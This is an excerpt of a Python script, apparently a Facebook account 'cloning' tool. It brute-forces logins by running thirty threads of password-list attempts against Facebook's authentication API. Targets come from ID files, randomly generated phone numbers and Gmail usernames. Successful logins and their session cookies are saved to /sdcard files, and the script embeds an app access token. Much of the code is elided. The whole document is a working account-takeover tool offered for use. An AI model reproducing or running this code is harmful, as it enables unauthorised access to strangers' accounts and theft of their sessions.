...
#──────────────{ LOGO }──────────────#
print ("jone my Facebook id 😁☢️")
os.system("xdg-open https://www.facebook.com/profile.php?id=61575266357634")
os.system("xdg-open https://www.facebook.com/profile.php?id=61575266357634")
logo = f"""{A}                        
 █▀ █░█ █▀▀ █▄█ ▄▀█ █▄░█
 ▄█ █▄█ █▀░ ░█░ █▀█ █░▀█         
...
FACEBOOK: https://www.facebook.com/profile.php?id=61575266357634{A}─────────────────────────────────────────────────"""
#──────────────{ MENU }──────────────#
def menu():
    clear()
...
def __Filex__():
    clear()
    print(f"{A}|=| EXAMPLE : /sdcard/SUFYAN.txt ");linex();dfile = input(f'{A}|?| CHOICE  : ')
    try:
    ...
    with ThreadPool(max_workers=30) as SUFUANx:
        ...
        for user in dx:
            ...
            passlist = dplist
            if methodx in ['1']:SUFYANx.submit(__file_M1__,ids,names,passlist)
            if methodx in ['2']: SUFYANx.submit(__file_M2__,ids,names,passlist)
            if methodx in ['3']:SUFYANx.submit(__file_M3__,ids,names,passlist)
            if methodx in ['4']:SUFYANx.submit(__file_M4__,ids,names,passlist)
            if methodx in ['5']:SUFYANx.submit(__file_M5__,ids,names,passlist)
            if methodx in ['6']:SUFYANx.submit(__file_M6__,ids,names,passlist)
            if methodx in ['7']:SUFYANx.submit(__file_M7__,ids,names,passlist)
            if methodx in ['8']:SUFYANx.submit(__file_M8__,ids,names,passlist)
...
def __file_M1__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SUFYAN-M1| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if "session_key" in po:
                ...
                open('/sdcard/SUFYAN-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|SUFYAN-CP| '+ids+f' | '+pas)
                open('/sdcard/SUFYAN-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
...
def __file_M2__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SUFYAN-M2| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if "session_key" in po:
                ...
                print(f'\r\r{R}|SUFYAN-CP| '+ids+f' | '+pas)
                open('/sdcard/SUFYAN-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
...
def __file_M3__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SUFYAN-M3| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if "session_key" in po:
                ...
                print(f'\r\r\x1b[38;5;46m|ASRAFUL-OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/SUFYAN-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|ASRAFUL-CP| '+ids+f' | '+pas)
                open('/sdcard/SUFYAN-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
...
def __file_M4__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SUFYAN-M4| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
...
def __file_M5__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SUFYAN-M5| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
...
def __file_M6__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SUFYAN-XD| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if "session_key" in po:
                ...
                print(f'\r\r{R}|ASRAFUL-CP| '+ids+f' | '+pas)
                open('/sdcard/SUFYAN-M6-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
...
def __file_M7__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SUFYAN-M7| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if "session_key" in po:
                ...
                print(f'\r\r{R}SUFYAN-CP| '+ids+f' | '+pas)
                open('/sdcard/SUFYAN-M7-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
...
def __file_M8__(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\r{A}|SUFYAN-M8| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in ASRAFULxd:
				...
				oks.append(ids)
				break
			elif 'checkpoint' in SUFYANxd:
				print(f'\r\r{R}|SUFYAN-CP| '+ids+' | '+pas)
				open('/sdcard/SUFYAN-M8-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
...
def __bdx__():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=30) as SUFYANx:
        clear()
        tl=str(len(user))
        ...
        for love in user:
            ...
            if methodx in ['1']:SUFYANLx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:SUFYANx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:SUFYANx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:SUFYANx.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:SUFYANx.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-INDIA }──────────────#
def __india__():
    user=[]
    ...
    with ThreadPool(max_workers=30) as SUFYANx:
        ...
        for love in user:
            ...
            if methodx in ['1']:SUFYANx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:SUFYANx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:SUFYANx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:SUFYANx.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:SUFYANx.submit(__Randm_M5__,ids,passlist)
...
def __Randm_M1__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SUFYAN-M1| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                print(f'\r\r{R}|SUFYAN-CP| {str(uid)} | {pas} ')
                                open('/sdcard/SUFYAN-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
...
def __Randm_M2__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SUFYAN-M2| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc2347a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
...
def __Randm_M3__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SUFYAN-M3| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
...
def __Randm_M4__(ids,passlist):
    ...
    try:
        for pas in passlist:
            session=requests.Session()
            sys.stdout.write(f'\r\r{A}|SUFYAN-M4| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\r\x1b[38;5;46m|SUFYAN-OK| {ids} | {pas} ')
                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
                open('/sdcard/SUFYAN-RNDM-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
                ...
                ids = "1000"+coki1[0:11]
                print(f'\r\r{R}|SUFYAN-OK| {ids} | {pas} ')
                open('/sdcard/SUFYAN-RANDM-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
...
def __Randm_M5__(ids,passlist):
    ...
    try:
        for pas in passlist:
            session=requests.Session()
            sys.stdout.write(f'\r\r{A}|SUFYAN-M5| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
...
def __GMAILX__(username,pswrd,total):
    global oks,cps,loop
    sys.stdout.write(f'\r\r{A}|SUFYAN-XD| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
    try:
        for password in pswrd:
            ...
            if 'session_key' in req:
                print(f'\r\r\x1b[38;5;46m|SUFYAN-OK| '+username+' | '+password)
                open('/sdcard/SUFYAN-GMAIL-OK.txt', 'a').write(username+' | '+password+'\n')
                oks.append(username)
                break
            elif 'www.facebook.com' in req['error_msg']:
                print(f'\r\r{R}|SUFYAN-CP| '+username+' | '+password)
                open('/sdcard/SUFYAN-GMAIL-CP.txt', 'a').write(username+' | '+password+'\n')
                cps.append(username)
                break
            else:
                continue
